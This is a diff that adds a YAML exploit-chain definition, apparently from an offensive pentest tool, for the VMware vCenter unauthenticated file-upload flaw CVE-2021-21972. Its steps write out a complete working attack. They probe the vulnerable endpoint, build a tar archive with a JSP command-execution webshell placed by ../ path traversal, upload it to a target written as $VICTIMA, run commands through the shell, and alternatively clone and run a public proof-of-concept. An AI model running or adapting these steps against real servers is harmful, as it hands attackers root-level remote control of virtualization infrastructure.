@@ -1,0 +1,60 @@
+chain_id: vcenter_cve_2021_21972
+title: "VMware vCenter — CVE-2021-21972 unauth file upload → RCE (vROps plugin)"
+severity: CRITICAL
+tags: [web, vmware, vcenter, vrops, cve-2021-21972, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2021-21972" }
+    - { banner_pattern: "(?i)vmware|vsphere|vcenter" }
+    - { path_pattern: "(?i)/ui/vropspluginui/rest/services/(uploadova|getstatus)" }
+
+description: |
+  vCenter Server 6.5–7.0 ships an unauthenticated endpoint
+  `/ui/vropspluginui/rest/services/uploadova` that accepts a tar
+  archive and writes its members anywhere on disk via path traversal.
+  Drop a JSP webshell into the Tomcat statsreport webapp on Linux,
+  or an SSH key on Windows, and you get root / SYSTEM. CISA-flagged,
+  mass-exploited.
+
+steps:
+  - id: 1
+    title: "Probe — 200 / 405 indicates the endpoint is exposed"
+    command: |
+      curl -sk -i "https://$VICTIMA/ui/vropspluginui/rest/services/uploadova"
+      curl -sk -i "https://$VICTIMA/ui/vropspluginui/rest/services/getstatus"
+
+  - id: 2
+    title: "Build a tar with a JSP webshell using ../ traversal"
+    command: |
+      cat > shell.jsp <<'JSP'
+      <%@ page import="java.util.*,java.io.*"%>
+      <% String c=request.getParameter("c"); if(c!=null){
+         Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
+         BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));
+         String l; while((l=r.readLine())!=null) out.println(l);} %>
+      JSP
+      mkdir -p '../../../../../../../../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/41/0/h5ngc.war/resources'
+      mv shell.jsp '../../../../../../../../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/41/0/h5ngc.war/resources/'
+      tar -cvf payload.tar '../../../../../../../../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/41/0/h5ngc.war/resources/shell.jsp'
+
+  - id: 3
+    title: "Upload the OVA archive"
+    command: |
+      curl -sk -X POST "https://$VICTIMA/ui/vropspluginui/rest/services/uploadova" \
+        -F "uploadFile=@payload.tar"
+
+  - id: 4
+    title: "Execute via the dropped JSP"
+    command: |
+      curl -sk "https://$VICTIMA/ui/resources/shell.jsp?c=id"
+
+  - id: 5
+    title: "Or run the public PoC"
+    command: |
+      git clone https://github.com/horizon3ai/CVE-2021-21972 /tmp/cve21972
+      python3 /tmp/cve21972/CVE-2021-21972.py -t $VICTIMA -o linux
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-21972
+  - https://www.vmware.com/security/advisories/VMSA-2021-0002.html
